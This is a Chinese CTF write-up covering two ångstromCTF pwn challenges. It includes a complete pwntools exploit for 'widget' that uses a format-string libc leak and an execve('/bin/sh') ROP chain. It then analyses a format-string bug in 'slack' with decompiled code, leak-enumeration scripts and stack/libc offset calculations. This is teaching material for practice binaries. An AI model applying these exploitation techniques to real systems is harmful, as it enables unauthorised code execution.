
```python
from pwn import \*
import warnings
import subprocess
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64') # 【注意】加上架构信息，不然rop模块会把该程序当成32位程序
context.log\_level = 'DEBUG'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane\_pid}', '-P']
def dbg():
gdb.attach(p)
# pause()
elf = ELF("./widget")
p = process("./widget")
libc = ELF("/lib/x86\_64-linux-gnu/libc.so.6")
# p = remote("","")
# ru("proof of work: ")
# pow = rl()
# sla("solution: ", subprocess.check\_output(pow, shell=True, text=True))
# step1: leak libc base address
sla(b"Amount: ",str(0x30)) # 这个值其实只要够大就可以
# 4个字符 \* 6 + 8个随意字符 + rbp + ret
payload = b'%p '\* 6 + b'xxxxxxxx' + p64(0x404500)+ p64(0x4013D9) #p64(0x4013E3)
sla("Contents: ", payload)
ru("Your input: ")
leak\_data = ru("xxxx").decode()
leak\_data\_list = leak\_data.split(" ")
print(leak\_data\_list)
leak\_libc\_addr = int(leak\_data\_list[2],16)
leak("libc\_some\_addr", leak\_libc\_addr)
libc.address = leak\_libc\_addr - (0x7ff82fb37a37 - 0x7ff82fa23000)
leak("libc\_base\_addr", libc.address)
# dbg()
# step2: rop
rop = ROP(libc)
# rop.raw(rop.find\_gadget(["ret"])) # 用system gadget失败了，原因待分析，不过做题的时候不用管，哪个不行就换另一个
# rop.system(next(libc.search(b"/bin/sh")))
#### execve("/bin/sh", 0, 0)
rop.execve(next(libc.search(b"/bin/sh")), 0, 0)
print(rop.dump())
sla(b"Amount: ",str(0x100)) # 这次写大点
payload = b'a'\* 0x20 + p64(0x404500) + rop.chain()
sla("Contents: ", payload)
itr()
```

![image-20230713005815729](upload/attach/202402/830671_89A4CVPG3R96EEZ.jpg)

# 5 slack

> Join the ångstromCTF slack!

该题运行在Ubuntu22的环境中

```dockerfile
FROM pwn.red/jail
COPY --from=ubuntu:22.04 / /srv
COPY slack /srv/app/run
COPY flag.txt /srv/app/flag.txt
RUN chmod 755 /srv/app/run
```

## 5.1 运行

这是模拟一个聊天软件？有一个机器人提醒你一些事情？有三次输入的机会。保护全开。

```shell
root@8edd47208f9e:/chal# ./slack
Welcome to slack (not to be confused with the popular chat service Slack)!
2023-07-13 15:46:16 -- slack Bot: Hi there! Just wanted to remind you that your weekly team meeting starts in 10 minutes.
Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa
2023-07-13 15:46:16 -- You: aaaa
2023-07-13 15:46:16 -- slack Bot: Don't forget to fill out your time sheet for the week by 5 pm today.
Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa
2023-07-13 15:46:16 -- You: aaaa
2023-07-13 15:46:16 -- slack Bot: Just a heads up - the office will be closed on Friday for a company-wide retreat.
Your message (to increase character limit, pay $99 to upgrade to Professional): aaaa
2023-07-13 15:46:16 -- You: aaaa
root@8edd47208f9e:/chal# checksec slack
[*] '/chal/slack'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
```

## 5.2 反编译

循环3次，每次都能触发同一个格式化字符串漏洞。

```c
int \_\_cdecl main(int argc, const char \*\*argv, const char \*\*envp)
{
unsigned int v3; // eax
int v4; // eax
int i; // [rsp+8h] [rbp-68h]
\_\_gid\_t rgid; // [rsp+Ch] [rbp-64h]
time\_t timer; // [rsp+10h] [rbp-60h] BYREF
struct tm \*tp; // [rsp+18h] [rbp-58h]
char s[32]; // [rsp+20h] [rbp-50h] BYREF
char format[40]; // [rsp+40h] [rbp-30h] BYREF
unsigned \_\_int64 v13; // [rsp+68h] [rbp-8h]
v13 = \_\_readfsqword(0x28u);
setbuf(\_bss\_start, 0LL);
setbuf(stdin, 0LL);
rgid = getegid();
setresgid(rgid, rgid, rgid);
puts("Welcome to slack (not to be confused with the popular chat service Slack)!");
timer = time(0LL);
tp = localtime(&timer);
v3 = time(0LL);
srand(v3);
for ( i = 0; i <= 2; ++i ) // 循环3次
{
strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);// 生成时间字符串
v4 = rand();
printf("%s -- slack Bot: %s\n", s, (&messages)[v4 % 8]);// 随机打印messages里的句子，里面有8句
printf("Your message (to increase character limit, pay $99 to upgrade to Professional): ");
fgets(format, 14, stdin); // 输入数据到format，最多14Byte
tp = localtime(&timer);
strftime(s, 0x1AuLL, "%Y-%m-%d %H:%M:%S", tp);// 再次生成时间字符串
printf("%s -- You: ", s);
printf(format); // 打印前面输入的format。格式化字符串漏洞
putchar(10); // 打印换行
}
return v13 - \_\_readfsqword(0x28u);
}
```

保护全开，这里也只有格式化字符串漏洞，那就只能想办法覆盖`ret`了。

1）覆写`ret`，那首先需要泄漏出栈里存放`ret`的地址

2）然后，覆盖为`rop`链的地址，那还需要泄漏出`libc`基址

所以总体思路：

1）泄漏栈和`libc`的地址

2）覆写`ret`为`rop`链的地址

## 5.3 调试

### 5.3.1 泄露栈地址和libc地址

首先，想要通过格式化字符串漏洞泄露栈上的内容，一般都会在输入时敲很多`%p`，但是注意，这里的每次输入最多14Byte。所以为了方便查看结果，以及不用敲那么多次输入，用脚本：

```python
from pwn import \*
import warnings
import subprocess
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64')
# context.log\_level = 'DEBUG'
context.log\_level = 'CRITICAL'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane\_pid}', '-P']
def dbg():
gdb.attach(p)
# pause()
elf = ELF("./slack")
# p = process("./slack")
libc = ELF("/lib/x86\_64-linux-gnu/libc.so.6")
# 循环16次，打印%i$p
for i in range(0x10):
p = process("./slack")
sla(b"): ", f"%{i}$p")
ru("You: ")
data = rl().strip()
print(f"{i=} {data=}")
p.close()
```

执行两次，结果如下：

```shell
root@8edd47208f9e:/chal# python3 exp.py
i=0 data=b'%0$p'
i=1 data=b'0x7fff6f4d5620' <--- 0x7ff -> 栈地址
i=2 data=b'(nil)'
i=3 data=b'0x7fdc7e7b2a37' <--- 这个变化有点大
i=4 data=b'0x1c'
i=5 data=b'0x7fffffff'
i=6 data=b'(nil)'
i=7 data=b'(nil)'
i=8 data=b'0x64b18516'
i=9 data=b'0x7f654113a6a0' <--- 选这个来计算libc地址
i=10 data=b'0x2d37302d33323032'
i=11 data=b'0x35323a3731203431'
i=12 data=b'0x32343a'
i=13 data=b'(nil)'
i=14 data=b'0xa7024343125'
i=15 data=b'(nil)'
root@8edd47208f9e:/chal# python3 exp.py
i=0 data=b'%0$p'
i=1 data=b'0x7ffe90dc0320' <---
i=2 data=b'(nil)'
i=3 data=b'0x7f02f86a3a37' <---
i=4 data=b'0x1c'
i=5 data=b'0x7fffffff'
i=6 data=b'(nil)'
i=7 data=b'(nil)'
i=8 data=b'0x64b18517'
i=9 data=b'0x7f137e5e76a0' <---
i=10 data=b'0x2d37302d33323032'
i=11 data=b'0x35323a3731203431'
i=12 data=b'0x33343a'
i=13 data=b'(nil)'
i=14 data=b'0xa7024343125'
i=15 data=b'(nil)'
```

接着，用`gdb`确认一下这两个`index`是否是`stack`和`libc`的地址，并计算偏移：

```python
# step1: leak stack/libc
sla(b"): ", "%1$p %9$p")
ru("You: ")
data = rl().strip().decode().split()
some\_stack\_addr = data[0]
some\_libc\_addr = data[1]
logsucc("some\_stack\_addr = " + some\_stack\_addr)
logsucc("some\_libc\_addr = " + some\_libc\_addr)
dbg()
itr()
```

`ret_addr - some_stack_addr = 0x7ffc8fb1e328 - 0x7ffc8fb1c190`

`libc_base_addr - some_libc_addr = 0x7f35e31bf000 - 0x7f35e33df6a0`

![image-20230715021206586](upload/attach/202402/830671_BFWWXXTQ5VHVT79.jpg)

验证之后，毛有问题。
